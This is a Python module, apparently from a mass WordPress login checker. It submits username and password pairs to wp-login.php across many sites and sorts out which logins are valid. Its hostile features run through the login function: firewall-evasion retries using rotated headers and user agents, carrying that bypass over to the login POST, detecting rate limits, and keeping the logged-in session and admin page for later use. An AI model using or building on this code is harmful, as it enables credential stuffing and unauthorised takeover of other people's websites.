"""WordPress login verification (wp-login.php) with WAF aware error handling."""

from __future__ import annotations

from dataclasses import dataclass, field
from urllib.parse import urlsplit

import requests

from func import waf as waf_mod

__all__ = ["LoginOutcome", "login", "RATE_LIMIT_MARKERS"]

RATE_LIMIT_MARKERS = (
    "too many failed login attempts",
    "too many attempts",
    "temporarily locked out",
    "you have exceeded the limit",
    "limit-login-attempts",
    "too many requests",
    "please try again later",
    "access from your ip has been limited",
    "you have been locked out",
    "erro: você excedeu o limite",
    "muitas tentativas",
    "tentativas de login excedidas",
)


@dataclass
class LoginOutcome:
    status: str = "Invalid"  # Valid | Invalid | Blocked | Error | NotWordPress
    valid: bool = False
    http_code: int | None = None
    waf: str | None = None
    bypass: str | None = None
    bypass_headers: dict = field(default_factory=dict)
    error: str = ""
    admin_html: str | None = None
    login_html: str | None = None
    session: object | None = None
    details: dict = field(default_factory=dict)


def _has_login_cookie(session: requests.Session) -> bool:
    try:
        for cookie in session.cookies:
            if cookie.name.startswith("wordpress_logged_in"):
                return True
    except Exception:
        pass
    return False


def _looks_rate_limited(response) -> bool:
    try:
        body = (response.text or "")[:120_000].lower()
    except Exception:
        return False
    return any(marker in body for marker in RATE_LIMIT_MARKERS)


def login(
    http,
    base_url: str,
    username: str,
    password: str,
    *,
    verbose: bool = False,
    log=None,
    waf_recheck: bool = False,
    recheck_attempts: int = 8,
    fetch_admin: bool = False,
) -> LoginOutcome:
    """Attempt a login and report what the server said.

    ``NotWordPress`` is returned when ``wp-login.php`` is a hard 404, saving a
    pointless POST - a big win when scanning large mixed lists.
    """
    login_url = f"{base_url}/wp-login.php"
    admin_url = f"{base_url}/wp-admin/"
    outcome = LoginOutcome()

    session = http.session()
    session.cookies.clear()

    response = http.get(login_url, session=session)
    if response is None:
        outcome.status = "Error"
        outcome.error = http.last_error() or "login page request failed"
        outcome.details["network_error"] = True
        return outcome

    if waf_mod.is_blocked(response):
        outcome.waf = waf_mod.detect_waf(response)
        if waf_recheck:
            if log:
                log(f"    blocked (HTTP {response.status_code}), trying evasion tricks...")
            new_response, info = waf_mod.recheck(
                http,
                login_url,
                session=session,
                attempts=recheck_attempts,
                log=log,
                verbose=verbose,
            )
            outcome.details["recheck_attempts"] = info.get("attempts", 0)
            if new_response is not None and info.get("success"):
                response = new_response
                outcome.bypass = str(info.get("bypass") or "")
                outcome.bypass_headers = dict(info.get("headers") or {})
                if info.get("url"):
                    outcome.details["login_url"] = info["url"]
                    login_url = str(info["url"])
            else:
                outcome.status = "Blocked"
                outcome.http_code = response.status_code
                outcome.error = f"WAF blocked the login page ({outcome.waf or 'http ' + str(response.status_code)})"
                return outcome
        else:
            outcome.status = "Blocked"
            outcome.http_code = response.status_code
            outcome.error = f"WAF blocked the login page ({outcome.waf or 'http ' + str(response.status_code)})"
            return outcome

    outcome.http_code = response.status_code
    outcome.waf = outcome.waf or waf_mod.detect_waf(response)
    try:
        outcome.login_html = response.text[:400_000]
    except Exception:
        outcome.login_html = None

    if response.status_code == 404:
        outcome.status = "NotWordPress"
        outcome.error = "wp-login.php not found (404)"
        return outcome
    if response.status_code >= 500:
        outcome.status = "Error"
        outcome.error = f"server error on login page (HTTP {response.status_code})"
        return outcome

    base_login_url = outcome.details.get("login_url") or f"{base_url}/wp-login.php"
    final_url = getattr(response, "url", "") or ""
    if "wp-login" in final_url:
        # the GET may have followed a canonical redirect (http->https, apex->www,
        # subdirectory install); the POST has to target the same URL
        base_login_url = final_url
    origin = base_url
    try:
        parts = urlsplit(base_login_url)
        if parts.scheme and parts.netloc:
            origin = f"{parts.scheme}://{parts.netloc}"
    except ValueError:
        pass
    admin_url = f"{origin}/wp-admin/"
    login_data = {
        "log": username,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": admin_url,
        "testcookie": "1",
    }
    post_headers = {"Referer": base_login_url, "Origin": origin}
    if outcome.bypass:
        # keep the evasion that worked for the GET on the POST as well
        from func.waf import HEADER_SETS, AGENT_SETS

        for label, headers in HEADER_SETS:
            if outcome.bypass.endswith(label):
                post_headers.update(headers)
        for label, agent in AGENT_SETS:
            if agent is not None and outcome.bypass.endswith(label):
                post_headers["User-Agent"] = agent

    response = http.post(
        base_login_url,
        data=login_data,
        headers=post_headers,
        allow_redirects=False,
        session=session,
    )
    if response is None:
        outcome.status = "Error"
        outcome.error = http.last_error() or "login POST failed (timeout/connection)"
        outcome.details["network_error"] = True
        return outcome

    outcome.http_code = response.status_code
    location = ""
    try:
        location = response.headers.get("Location", "") or ""
    except Exception:
        location = ""

    if response.status_code in (301, 302, 303, 307, 308) and "wp-admin" in location.lower():
        outcome.status = "Valid"
        outcome.valid = True
    elif _has_login_cookie(session):
        outcome.status = "Valid"
        outcome.valid = True
    elif waf_mod.is_blocked(response):
        outcome.waf = waf_mod.detect_waf(response) or outcome.waf
        if waf_recheck:
            if log:
                log("    login POST blocked, retrying with evasion...")
            retry, info = waf_mod.recheck(
                http,
                base_login_url,
                method="POST",
                data=login_data,
                session=session,
                attempts=max(1, recheck_attempts // 2),
                log=log,
                verbose=verbose,
            )
            if retry is not None and retry.status_code in (301, 302, 303, 307, 308):
                retry_location = retry.headers.get("Location", "") or ""
                if "wp-admin" in retry_location.lower() or _has_login_cookie(session):
                    outcome.status = "Valid"
                    outcome.valid = True
                    outcome.bypass = str(info.get("bypass") or outcome.bypass)
                    if info.get("headers"):
                        outcome.bypass_headers.update(dict(info["headers"]))
                    outcome.http_code = retry.status_code
                    location = retry_location
            if not outcome.valid:
                outcome.status = "Blocked"
                outcome.error = f"WAF blocked the login POST ({outcome.waf or 'blocked'})"
                return outcome
        else:
            outcome.status = "Blocked"
            outcome.error = f"WAF blocked the login POST ({outcome.waf or 'blocked'})"
            return outcome
    elif _looks_rate_limited(response):
        outcome.status = "Blocked"
        outcome.error = "login rate-limited by the target"
        return outcome
    else:
        outcome.status = "Invalid"
        outcome.error = ""
        outcome.http_code = response.status_code
        return outcome

    # ---- logged in ----------------------------------------------------- #
    outcome.details["redirect"] = location
    extra_headers = outcome.bypass_headers or None
    if fetch_admin:
        admin_response = http.get(admin_url, session=session, headers=extra_headers)
        if admin_response is not None and admin_response.status_code == 200:
            try:
                outcome.admin_html = admin_response.text[:800_000]
            except Exception:
                outcome.admin_html = None
        if admin_response is not None:
            outcome.details["admin_status"] = admin_response.status_code
    outcome.session = session
    return outcome
